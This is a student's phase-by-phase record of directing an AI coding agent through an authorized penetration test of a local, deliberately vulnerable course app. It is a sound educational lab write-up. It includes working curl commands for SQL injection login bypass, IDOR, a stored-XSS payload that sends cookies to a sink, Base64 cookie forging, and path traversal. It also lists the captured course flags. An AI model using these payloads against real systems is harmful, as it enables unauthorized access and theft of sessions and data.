# AI Workflow — How I Directed Claude Code
### INF601 Mini Project 4, Track A (Vuln Hub)

This document records how I (cdmauch) directed Claude Code as an agent during the
Vuln Hub penetration test, phase by phase. It is reconstructed from the actual
session and file/commit history. Commands and results shown are the ones that
were really executed and observed; where a phase had no failed attempts, that is
stated rather than invented.

**Agent:** Claude Code (Claude Opus). **Target:** local Vuln Hub at
`http://127.0.0.1:5000`, authorized practice target only.

---

## Phase 1 — Recon, scope confirmation, and setup

**1. My objective and instructions.** I asked the agent to read `app.py` and the
Track A `README.md`, then conduct an authorized penetration test of **only** the
local app, demonstrating six vulnerabilities (SQLi, IDOR, stored XSS, broken
authorization, path traversal, sensitive-data exposure). My standing instructions:
work one finding at a time, show the testing actions, capture the real flag for
each, save the request and result, and **never invent flags or results**.

**2. Tools and commands executed.**
- `Glob` for `**/*.{py,md,txt}` to locate project files.
- `Read` on `app.py` and `README.md`.
- `curl -s -i http://127.0.0.1:5000/` to confirm the server was up.
- `curl -s http://127.0.0.1:5000/ | grep -i -E "default|seed|banner"` to check
  the default-seed warning.
- `mkdir -p poc` to create an evidence folder.

**3. Results observed.** Server responded `200 OK`,
`Server: Werkzeug/3.1.9 Python/3.13.15`. No default-seed banner was present,
indicating the server was running with a real `FLAG_SEED` (so captured flags
would be valid). Source review confirmed the six planted bugs and their routes.

**4. What I reviewed/verified.** I confirmed the files were the instructor-
provided target, that only the local app was in scope, and that the server was
using a real seed before any flags were captured.

**5. Changes after unsuccessful attempts.** None — setup succeeded on the first
attempt.

---

## Phase 2 — Finding 1: SQL injection (login bypass)

**1. Objective and instructions.** Begin the test with SQL injection; proceed on
my go-ahead ("yes, continue").

**2. Tools and commands executed.**
```bash
curl -s -i -c poc/sqli_cookies.txt \
  --data-urlencode "username=admin' -- -" --data-urlencode "password=x" \
  http://127.0.0.1:5000/login
curl -s -b poc/sqli_cookies.txt http://127.0.0.1:5000/dashboard
```

**3. Results observed.** `302 FOUND` → `/dashboard`, `Set-Cookie: auth=YWRtaW46YWRtaW4=`
(Base64 `admin:admin`). Dashboard showed:
`Nice work bypassing the login. FLAG{sqli_d14aa78ca248}`.

**4. What I reviewed/verified.** I reviewed the exact payload, the 302 redirect,
the decoded cookie, and the flag in the live response. The agent saved
`poc/01_sqli.md` and `poc/01_sqli_login_response.txt`.

**5. Changes after unsuccessful attempts.** None — the bypass worked on the first
request. (The agent's initial description mentioned a generic `' OR '1'='1'`
style payload, but the command actually executed and recorded was
`username=admin' -- -`, which selects the admin row directly.)

---

## Phase 3 — Finding 2: IDOR

**1. Objective and instructions.** Continue to IDOR ("yes, continue"): read a
message that isn't the logged-in user's.

**2. Tools and commands executed.**
```bash
curl -s -i -c poc/idor_cookies.txt \
  --data-urlencode "username=alice" --data-urlencode "password=password123" \
  http://127.0.0.1:5000/login
curl -s -b poc/idor_cookies.txt http://127.0.0.1:5000/messages      # lists #4,#5
curl -s -i -b poc/idor_cookies.txt http://127.0.0.1:5000/messages/1 # admin's
```

**3. Results observed.** Logged in as `alice` (cookie `YWxpY2U6dXNlcg==` =
`alice:user`); her message list showed only IDs 4 and 5. `GET /messages/1`
returned `200 OK` with admin's "Onboarding secret":
`Internal only. Do not share. FLAG{idor_25b3a6bacc94}`.

**4. What I reviewed/verified.** I confirmed alice owned only 4–5, yet could read
admin's message #1, and that the flag appeared in the response. Saved
`poc/02_idor.md`, `poc/02_idor_response.txt`.

**5. Changes after unsuccessful attempts.** None.

---

## Phase 4 — Finding 3: Stored XSS

**1. Objective and instructions.** Continue to stored XSS ("yes, continue"):
steal the admin's cookie via the guestbook.

**2. Tools and commands executed.**
```bash
curl -s -i -b poc/idor_cookies.txt \
  --data-urlencode "comment=<script>fetch('/grab?c='+document.cookie)</script>" \
  http://127.0.0.1:5000/guestbook
curl -s http://127.0.0.1:5000/guestbook | grep -i "script"   # confirm unescaped
# then poll the sink until the simulated admin bot fired:
for i in 1..10: curl -s http://127.0.0.1:5000/grab (2s apart)
```

**3. Results observed.** The comment was stored and returned **unescaped** as a
raw `<script>` tag. On the first poll of `/grab`, the simulated admin bot had
already executed the script with the admin cookie; the sink recorded:
`c=session=admin; flag=FLAG{xss_d7ddad05744e}`.

**4. What I reviewed/verified.** I verified the payload was stored without
escaping and that the exfiltrated cookie containing the flag reached `/grab`.
Saved `poc/03_xss.md`, `poc/03_xss_grab_response.txt`.

**5. Changes after unsuccessful attempts.** None — the capture succeeded on the
first poll (the bot polls every ~2s).

---

## Phase 5 — Finding 4: Broken authorization

**1. Objective and instructions.** Continue ("continue"): reach `/vault`
(superadmins only) by forging the session cookie.

**2. Tools and commands executed.**
```bash
curl -s -i -b poc/idor_cookies.txt http://127.0.0.1:5000/vault   # baseline (user)
FORGED=$(printf '%s' "hacker:superadmin" | base64)               # aGFja2VyOnN1cGVyYWRtaW4=
curl -s -i --cookie "auth=$FORGED" http://127.0.0.1:5000/vault
```

**3. Results observed.** With role `user`: `403 FORBIDDEN` ("superadmins only").
With the forged `hacker:superadmin` cookie: `200 OK`, "Access granted,
superadmin.", `FLAG{authz_9e92b94b4dde}`.

**4. What I reviewed/verified.** I reviewed the 403 baseline, the decoded forged
cookie, and the 200 with the flag. Saved `poc/04_authz.md`,
`poc/04_authz_response.txt`, `poc/04_forged_cookie.txt`.

**5. Changes after unsuccessful attempts.** None.

---

## Phase 6 — Finding 5: Path traversal

**1. Objective and instructions.** Continue ("continue"): make `/download` serve
a file outside its intended directory.

**2. Tools and commands executed.**
```bash
curl -s -G --data-urlencode "file=welcome.txt" http://127.0.0.1:5000/download     # baseline
curl -s -i -G --data-urlencode "file=../private/employee_notes.txt" \
  http://127.0.0.1:5000/download
```

**3. Results observed.** Baseline returned the intended public welcome file. The
traversal request returned `200 OK` with the confidential sibling file ending in
`FLAG{traversal_0f400e8109b6}`.

**4. What I reviewed/verified.** I confirmed the `../` escape reached the
`private/` directory and returned the flag. Saved `poc/05_traversal.md`,
`poc/05_traversal_response.txt`.

**5. Changes after unsuccessful attempts.** None.

---

## Phase 7 — Finding 6: Sensitive data exposure

**1. Objective and instructions.** Continue ("yes"): find an exposed file,
starting recon at `/robots.txt`.

**2. Tools and commands executed.**
```bash
curl -s http://127.0.0.1:5000/robots.txt
curl -s -i http://127.0.0.1:5000/backups/vulnhub.sql.bak
```

**3. Results observed.** `/robots.txt` disclosed `Disallow: /backups/`.
`GET /backups/vulnhub.sql.bak` returned `200 OK` with a DB backup containing
`INSERT INTO secrets VALUES ('FLAG{exposure_294b6fe0e0bb}');`.

**4. What I reviewed/verified.** I confirmed `robots.txt` leaked the path and the
backup was downloadable without authentication, with the flag in the body. Saved
`poc/06_exposure.md`, `poc/06_exposure_response.txt`.

**5. Changes after unsuccessful attempts.** None.

---

## Phase 8 — Assemble submission and validate flags

**1. Objective and instructions.** Collect the six flags and validate them with
the course checker.

**2. Tools and commands executed.**
- `Read` on `submission.example.txt` and `check_flags.py` to confirm format.
- `Write` `submission.txt` with the six captured flags.
- Checked the shell for `FLAG_SEED` (not set — it lives only in the server
  process), so I was asked for my username.
- `.venv/Scripts/python.exe check_flags.py submission.txt --username cdmauch`

**3. Results observed.** The checker reported each flag `VALID` and
`6/6 flags valid for username cdmauch`.

**4. What I reviewed/verified.** I provided my FHSU username (`cdmauch`) and
confirmed the 6/6 validation output.

**5. Changes after unsuccessful attempts.** The agent first tried to collect my
username through a structured question prompt; that interaction returned only the
selected option without my typed text, so the agent re-asked in plain chat and I
replied `cdmauch`. The validation then ran successfully.

---

## Phase 9 — Interim report and AI-usage note

**1. Objective and instructions.** "Generate both" — a pentest report and a
README AI-usage section.

**2. Tools and commands executed.** `Write` `report.md` (concise report) and
`Write` `AI_USAGE.md`, built from the `poc/*.md` files.

**3. Results observed.** Both files created; the instructor `README.md` was left
untouched.

**4. What I reviewed/verified.** I reviewed the consolidated findings and
remediation. (`report.md` was later superseded — see Phase 11–12.)

**5. Changes after unsuccessful attempts.** None.

---

## Phase 10 — Initialize the git repository

**1. Objective and instructions.** "Initialize a git repo for the submission."

**2. Tools and commands executed.**
- `Read` `.gitignore` (found it ignores `submission.txt`, which the rubric
  requires).
- `git init -b main`; confirmed author identity (an existing global identity,
  `Datcat78`, was already configured).
- `git add -A` then `git add -f submission.txt` (force-added the required file).
- `git status --short`, then the initial `git commit`.

**3. Results observed.** Repository initialized on `main`; initial commit
`ee3a17a` with 40 tracked files. `.venv/`, `vulnhub.db`, and the planted flag
files remained ignored; `submission.txt` was included.

**4. What I reviewed/verified.** I reviewed the staged file list and confirmed
`submission.txt` was tracked while the venv/db were excluded.

**5. Changes after unsuccessful attempts.** The default `.gitignore` would have
excluded `submission.txt`; the agent force-added that one file so the required
flags are tracked. (Benign LF→CRLF line-ending warnings appeared on Windows and
required no action.)

---

## Phase 11 — Full PENTEST_REPORT.md

**1. Objective and instructions.** Create `PENTEST_REPORT.md` at a professional
undergraduate level using my actual evidence: authorization/ethics statement,
executive summary, scope, methodology, six detailed findings with justified
severity, PoC references, impact, remediation, limitations, conclusion, and AI
usage — without inventing anything, and flagging items needing my input.

**2. Tools and commands executed.** `Write` `PENTEST_REPORT.md`, drawn from the
captured evidence and the `check_flags.py` output.

**3. Results observed.** Report created with all requested sections and `[VERIFY:
...]` markers for the tester name, signature/date, and optional screenshots.

**4. What I reviewed/verified.** I reviewed the findings, severity rationale
(likelihood × impact), and the verification section against the real captures.

**5. Changes after unsuccessful attempts.** None at creation.

---

## Phase 12 — Finalize reports in git

**1. Objective and instructions.** "Yes and remove report.md" — commit the full
report and delete the interim one.

**2. Tools and commands executed.**
```bash
git rm report.md
git add PENTEST_REPORT.md
git commit   # commit 57f122c
```

**3. Results observed.** Commit `57f122c` added `PENTEST_REPORT.md` and removed
`report.md`; `PENTEST_REPORT.md` is the only report tracked.

**4. What I reviewed/verified.** I confirmed the log showed both commits and that
only the full report remained.

**5. Changes after unsuccessful attempts.** None.

---

## Phase 13 — This workflow document

**1. Objective and instructions.** Create `AI_WORKFLOW.md` documenting, per
phase, my objectives/instructions, the tools/commands executed, results observed,
what I reviewed/verified, and any changes after unsuccessful attempts — using the
real session and file history, without invented actions.

**2. Tools and commands executed.** `Write` `AI_WORKFLOW.md` (this file).

**3. Results observed.** This document.

**4. What I reviewed/verified.** I am reviewing this file for accuracy against my
recollection of the session before submitting.

**5. Changes after unsuccessful attempts.** None.

---

### Items still requiring my input
- Replace the tester name and sign/date the authorization statement in
  `PENTEST_REPORT.md` (`[VERIFY: ...]`).
- Add browser screenshots if my rubric requires them (evidence here is saved as
  HTTP request/response text under `poc/`).
- Confirm the git author name (`Datcat78`) is acceptable, or set my real name for
  the repo before pushing to GitHub as `miniproject4<MyFullName>`.
